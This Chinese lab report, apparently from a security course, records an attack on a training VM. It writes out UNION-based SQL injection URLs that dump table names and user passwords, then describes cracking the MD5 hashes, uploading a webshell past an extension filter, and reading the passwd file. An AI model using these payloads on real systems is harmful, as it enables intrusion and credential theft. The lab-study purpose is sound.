实验三 SQL注入Shell
==============================

## 实验环境准备


### 下载镜像文件，安装在虚拟机


### 攻击机和服务器在同一NAT网络

* #### 1.服务器

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E7%9B%AE%E6%A0%87%E6%9C%8D%E5%8A%A1%E5%99%A8ifconfig.jpg)

* #### 2.攻击机

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E6%94%BB%E5%87%BB%E6%9C%BAifconfig.jpg)


## 实验过程

* ### 使用 nmap 查看服务器开启情况

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/nmap%E6%9F%A5%E7%9C%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8F%A3.jpg)

* ### 攻击机访问服务器，使用Burpsuite抓到应答包，获取服务器相关信息

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/burpsuite%E6%8A%93http%E5%8C%85.jpg)


* ### 使用 wfuzz 获取服务器的文件目录

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/WFUZZ%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6.jpg)

## 检测利用SQL注入漏洞

* ### 攻击机通过浏览器访问服务器

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E8%AE%BF%E9%97%AE%E6%9C%8D%E5%8A%A1%E5%99%A8.jpg)


* ### 地址 http://10.0.2.12/cat.php?id=1 页面

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/1.jpg)


* ### 地址 http://10.0.2.12/cat.php?id=2-1 页面

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/2-1.jpg)

### 我们发现两个页面获取的页面相同，所以此时证明存在SQL注入漏洞

* ### 使用  http://10.0.2.12/cat.php?id=2 union select 1,2,3,4   查询列数为4

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/union%20select%201%2C2%2C3%2C4%2C.jpg)

* ### 使用  http://10.0.2.12/cat.php?id=2 union select 1,@@version.3.4   获取数据库的版本信息

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%40%40version.jpg)


* ### 使用  http://10.0.2.12/cat.php?id=2 union select 1,concat(table_name,':',column_name),3,4 from information_schame.columns   获取用户表

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/concat.jpg)

* ### 使用   http://10.0.2.12/cat.php?id=2 union select 1,concat(login,':',password),3,4 from users   直接获取用户名和密码

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81.jpg)



* ### 在线破解MD5值，获取密码

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E7%A0%B4%E8%A7%A3MD5.jpg)


* ### 使用获取的用户名和密码登录

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E7%99%BB%E5%BD%95.jpg)


* ### 在本地写一个Shell.php.test文件，绕过服务器对php文件的检测，上传之后，我们可以看到变化

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/Test.jpg)



* ### 通过webshell查看服务器的passwd文件

![](https://raw.githubusercontent.com/Geraens/ns/5bf06c8fd68394c895ce602be491c17228500878/2017-2/Geraens/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%96%87%E4%BB%B6/SQL%E6%B3%A8%E5%85%A5%E5%88%B0Shell/%E5%AE%9E%E9%AA%8C%E5%9B%BE%E7%89%87/%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6.jpg)
